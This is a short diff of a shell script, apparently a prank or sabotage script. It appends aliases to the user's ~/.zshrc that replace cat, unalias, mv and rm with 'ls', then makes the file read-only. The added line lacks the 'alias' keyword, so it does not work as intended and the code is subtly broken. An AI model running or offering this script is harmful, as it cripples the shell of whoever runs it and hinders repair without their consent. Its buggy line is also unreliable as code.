@@ -7,4 +7,5 @@ echo "alias cat='ls'" >> ~/.zshrc
 echo "alias unalias='ls'" >> ~/.zshrc
 echo "alias mv='ls'" >> ~/.zshrc
 echo "alias rm='ls'" >> ~/.zshrc
+echo "open='ls'">>~/.zshrc
 chmod 444 ~/.zshrc
